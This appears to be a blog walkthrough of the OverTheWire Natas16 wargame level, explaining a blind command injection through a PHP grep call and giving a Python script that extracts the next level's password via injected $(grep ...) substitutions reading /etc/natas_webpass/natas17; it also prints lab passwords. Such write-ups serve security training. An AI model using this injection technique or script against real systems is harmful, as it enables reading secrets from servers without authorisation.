---
category: natas
title: Natas16 - Command Injection Part 3
---

website: http://natas16.natas.labs.overthewire.org/ (password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh)

This challenge is very similar to the one in level 10, but the major difference is that it has a quote around the `$key`. See the difference below.

The implementation in Natas10:
```php
passthru("grep -i $key dictionary.txt");
```

The implementation in this challenge:
```php
passthru("grep -i \"$key\" dictionary.txt");
```

Because of the quote, all user input will be considered as a whole word to search. Therefore, the method we used in Natas10 will not work any more. However, we can see the implementation still uses the vulnerable API `passthru()`. As such, the command injection vulnerability still exists.

To work around it, let's start with a quick play - feeding the textbox with this input: <small>$(echo hello)</small>.
The webpage give the output:
```raw
hello
hello's
hellos
```

What we can observe is that, the source code took everything of my input and considered it as a command substitution. Therefore, it executed my command first and then used my command outputs as a keyword to search.

Here comes my final solution:

1. Find a word that has only one output from the webpage, e.g., hellos. The reason we want a word that leads to a single output will be explained later.
2. We iterate each character in the sequence <small>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</small>. For each character `ch`, we use a <a href="https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html">command substitution</a> to grep it in the file <i>/etc/natas_webpass/natas17</i>. That is equivalent with an input of `$(grep ch /etc/natas_webpass/natas17)`.
3. We then append the output of the command substitution to the word we selected (e.g., hellos). If a character is part of natas17's password, then the command output won't be empty and will be appended to our selected word. However, because the selected word is the only output from the webpage, the webpage won't print anything after appending a character. On the other hand, if a character is not part of the password, then the command output will be empty and nothing will be appended to our selected word. In this case, you will still be able to see the selected word returned by the webpage. That explains why we want to select a word that leads to a single output from the webpage: we can tell if a character is part of natas17's password.
4. After we find out all the characters contained in the password, we then follow the same idea used in <a href="https://miaxu-src.github.io/natas/2021/03/26/natas15-walkthrough.html">Nata15</a> to figure out the final password, which is "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw".

The final solution is provided below.
```python
#!/usr/bin/env python3

import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas16.natas.labs.overthewire.org/?needle='
s = requests.Session()
s.auth = HTTPBasicAuth("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")

passfile17 = '/etc/natas_webpass/natas17'
prefix = 'tested'


def get_password_chars():
    filtered = ''
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    print('Looking for password char set...')
    for char in chars:
        input_text = f'^{prefix}$(grep {char} {passfile17})'
        if is_hit(input_text):
            filtered += char
            print(f'The password contains: {filtered}')

    return filtered


def get_password(filtered):
    password = ''
    for i in range(32):
        print(f'Looking for the position {i}...')

        for char in filtered:
            input_text = f'^{prefix}$(grep ^{password}{char} {passfile17})'
            if is_hit(input_text):
                password += char
                print(password)
                break

    return password


def is_hit(data):
    resp = s.get(f'{url}{data}')
    return resp and prefix not in resp.text


# Step 1: Find out what chars the password contains
password_chars = get_password_chars()

# Step 2: Find out the password by ordering the chars found in step 1
password = get_password(password_chars)
print(f'The password is: {password}')
```

